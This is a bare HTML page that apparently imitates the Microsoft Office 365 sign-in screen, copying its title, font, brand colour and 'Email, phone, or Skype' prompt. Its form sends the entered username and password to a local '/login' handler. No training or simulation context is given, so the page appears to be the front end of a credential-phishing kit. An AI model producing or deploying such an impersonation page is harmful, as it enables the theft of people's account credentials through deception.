<!DOCTYPE html>
<html>
<head><title>Office 365 Login</title></head>
<body style="font-family:Segoe UI, sans-serif; background-color:#f3f2f1;">
  <div style="width:300px; margin:auto; padding:20px; background:white; margin-top:100px; border:1px solid #ccc;">
    <h2 style="color:#0078d4;">Sign in</h2>
    <form method="POST" action="/login">
      <input type="text" name="username" placeholder="Email, phone, or Skype" style="width:100%; padding:10px;"><br><br>
      <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px;"><br><br>
      <input type="submit" value="Sign In" style="width:100%; padding:10px; background-color:#0078d4; color:white; border:none;">
    </form>
  </div>
</body>
</html>
